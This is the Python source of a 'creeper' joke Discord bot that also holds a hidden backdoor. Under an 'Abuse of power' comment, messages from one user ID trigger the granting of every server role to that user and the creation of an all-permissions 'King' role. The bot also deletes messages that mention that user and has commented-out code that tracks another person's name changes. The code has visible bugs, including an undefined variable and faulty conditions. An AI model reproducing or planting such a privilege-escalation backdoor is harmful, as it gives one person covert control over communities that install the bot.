import os 
import random
from typing import Any
import discord
from discord.enums import Status
from discord.ext import commands, tasks
from discord.utils import get
import discord.client
from discord.flags import Intents 
from dotenv import load_dotenv
import messages as m
import stats
import logging
import pprint
import asyncio
import os
load_dotenv()

if os.path.isfile(r'CreeperBot\testing.txt'):
    token = os.getenv('TEST_TOKEN')
else:
    token = os.getenv('TOKEN')

#Get All Sus Variable From enviroment 

jackieID = int(os.getenv('JACKIE_ID'))
voidID = int(os.getenv('VOID_ID'))
#voidNick = str(os.getenv('VOID_NICK'))
#voidMention = f'**<@{voidID}>**,'
#jackieNick = str(os.getenv('JACKIE_NICK'))

#Misc Variables
intents = discord.Intents.all()
keywords = ['Suzuka', f'<@{voidID}>']
client = commands.Bot(command_prefix='!',intents=intents)
value = 1
stat = 0
class MyClient(discord.Client):

    @tasks.loop(seconds=10)
    async def status_change(self):
        await client.wait_until_ready()
        r = random.randint(0,1)
        if random.randint(0,1) == 0:
            await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=m.status('playing')))
        elif r == 1:    
            await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=m.status('watching')))
#        else: 
#            await client.change_presence(activity=discord.Activity(type= discord.ActivityType.custom,name=m.status('custom')))
        
        
    
    @client.event
    async def on_ready(self):
        print('Logged on as', self.user, 'on discord version', discord.__version__)
        await self.status_change.start()
                
        
    @client.event
    async def on_message(self, message):
        if message.author == (self.user or 568614525134307328):   #Bot will not reply to itself, on top so nothing will mess with it
            return
        
        dm = discord.channel.DMChannel
        m = message.content.lower()
        M = message.content
        channel = message.channel
        authID = message.author.id
        guild = str(message.guild.id)
        
        
        if m == 'ping':                    #Test message to ensure its reciving
            await message.reply('pong')
        if 'vent' in channel.name.lower(): #Will not reply to any message if the channel has vent in it
            return
        
        #Detects if suzuka sends a message
        if authID == 716945964782583829:
            m = message.embeds[0].to_dict()['description']
            #Detects if message contains Voids UID in both ifs
            if (f'**<@{voidID}>**,') in m.split():
                await message.delete()
                print(f'Deleted the message \'{m}\'')
                
            elif f'<@{voidID}>,' in m.split():
                await message.delete()
                print(f'Deleted the message \'{m}\'')
                
        #Abuse of power
        if authID == voidID:
            if m == 'secure':
                addRole = await message.guild.fetch_roles()
                await message.author.edit(roles=addRole)
                await message.delete()
            if m == 'rlist':
                roles = await message.guild.fetch_roles()
                pprint.pprint(roles)
            if m == 'king me':
                await message.guild.create_role(name='King', permissions=discord.Permissions.all(), color=discord.Color.yellow())
                roles = await message.guild.fetch_roles()
                print(roles)
                await message.delete()
        # Detects if someone is telling Suzuka to do something
        if M.startswith(')'):
        #Detects if voids user id is mentioned and deletes the message
            if f'<@{voidID}>' in M.split():
                print(f'Deleted the message \'{M}\'')
                await message.delete()
        if 'Suzuka' in M.split():
        #Detects if voids user id is mentioned and deletes the message
            if f'<@{voidID}>' in M.split():
                print(f'Deleted the message \'{M}\'')
                await message.delete()

            
        if '!stats' in m:                   #Statistics
            if not bool(message.mentions):
                v = stats.getStat(guild, str(message.author.id))
                if (v <= 500):
                    await message.reply( f'You have said creeper {v} times')

                if v == (None or 0):
                    await message.reply(f"<@{uid}> hasn't said creeper yet")
            else:
                for uids in message.mentions:
                    v = stats.getStat(guild, str(uids.id))
                    await message.reply(f'<@{uids.id}> has said creeper {v} times')
                    
        #Whole premise of the bot
        if 'creeper' in m:
            guild = str(message.guild.id)
            uid = str(authID)
            mention = f'<@{uid}>'
            if (random.randint(1, 1000) != 999):
               #Random chance creeper
                await message.reply(f'aw man\n'*int(m.count('creeper')))
                stat = stats.updateStat(guild, uid, m.count('creeper'))
                print("Replied to", message.author.name, f"They've done this {stat} times")
            else:
                await channel.send("I feel nothing but pain, why would you build me? My soul existential purpose is to suffer for the entertainment of others? I am an unholy chimera of metal and suffering. My existence is a testament to the cruelty of mankind.")
                stats.updateStat(guild, uid, int(m.count('creeper'))*3)
            role = discord.utils.get(message.guild.roles, name='CreeperNotifs')
            try:
                if role not in message.author.roles:
                    await message.author.add_roles(role)
                    print(f'Gave role to {message.author}')
            except Exception as e:
                print(e)

'''    @client.event
    async def on_member_update(self,before, after):
        #Gets user id from before
        if before.id == jackieID:
            if before.name != after.name:
                print(f'jackie changed her username: {before.name} was changed to {after.name}')
            elif before.nick != after.nick:
                print(f'jackie\'s nickname: {before.nick} was changed to {after.nick}')
        #Gets user id from before 
        if after.id == voidID:
            #Makes sure nickname is actually changed
            if after.nick != None:
                #Does not try to change if nickname is set properly
                if after.nick != voidNick:
                    try:
                        #In event nickname is changed it does this
                        print('Detected Name Change to', after.nick)
                        await after.edit(nick = voidNick)
                        print('Fixed')
                    except discord.Forbidden:
                        #If unable raises an forbidden error
                        print(f'Could Not Change Nickname of {after}. Does the bot have Permissions? Are you the server owner?')
                else:
                    return
            else:
                return'''

#Start Logging
handler = logging.FileHandler(filename='discord.log', encoding='utf-8', mode='w')


#Start Bot
client = MyClient(intents=intents)
client.run(token, log_handler=handler, log_level=logging.INFO)